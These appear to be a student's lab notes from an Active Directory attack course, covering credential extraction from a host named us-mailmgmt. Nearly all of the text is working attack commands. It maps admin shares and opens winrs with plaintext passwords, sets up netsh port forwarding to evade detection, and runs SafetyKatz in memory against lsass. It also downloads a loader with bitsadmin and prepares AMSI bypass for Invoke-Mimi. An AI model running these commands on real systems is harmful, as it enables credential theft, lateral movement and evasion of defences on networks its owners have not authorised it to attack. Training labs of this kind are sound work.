
Task 
• Extract credentials of interactive logon sessions and service accounts from us-mailmgmt.

We can use either winrs and open-source binaries or PowerShell Remoting and Invoke-Mimi.ps1. Let us try them one by one.

```
net use x: \\us-mailmgmt\C$\Users\Public /user:usmailmgmt\Administrator t7HoBF+m]ctv.]
```

```
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
```

```
net use x: /d
```


![[Pasted image 20250317193023.png]]

we can download and run SafetyKatz in memory using Loader. To bypass behaviour detection of SafetyKatz we need to perform an additional step. We need to forward traffic from local (target) machine to the student VM. This way, the download always happens from 127.0.0.1

Run the following commands to connect to us-mailmgmt using winrs and forward the traffic. Remember to modify the IP address in connectaddress in the netsh command to your student VM:

```
winrs -r:us-mailmgmt -u:.\administrator -p:684@@2O0Ybz$#N cmd
```

```
netsh interface portproxy add v4tov4 listenport=8080listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.139
```

![[Pasted image 20250317193439.png]]

Now, we will use the Loader.exe to run SafetyKatz.exe from memory to extract credentials from the lsass process. Remember to host SafetyKatz.exe on a local web server on your Student VM.

Use ArgSplit.bat on the student VM to encode "sekurlsa::ekeys":

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn%" "exit"
```

![[Pasted image 20250317193841.png]]

we could also use bitsadmin, a Microsoft signed binary to download NetLoader on usmailmgmt. Remember to host Loader.exe on a local web server on your student VM.

```
winrs -r:us-mailmgmt -u:.\administrator -p:-7v0;-X$(41w@[  "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe
```

### PowerShell Remoting and Invoke-Mimi

We will use Invoke-Mimi on us-mailmgmt to extract credentials.

```
$passwd = ConvertTo-SecureString '-7v0;-X$(41w@[' -AsPlainText -Force
```

```
$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
```

```
 $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
```

We need to disable AMSI for the PSSession so that we can use the stock Invoke-Mimi.ps1 script. To avoid disabling AMSI, you can use modified Invoke-Mimi instead:

```
Enter-PSSession $mailmgmt
```

![[Pasted image 20250317195042.png]]

disable the AMSI In mailmgmt and exit

![[Pasted image 20250317195318.png]]

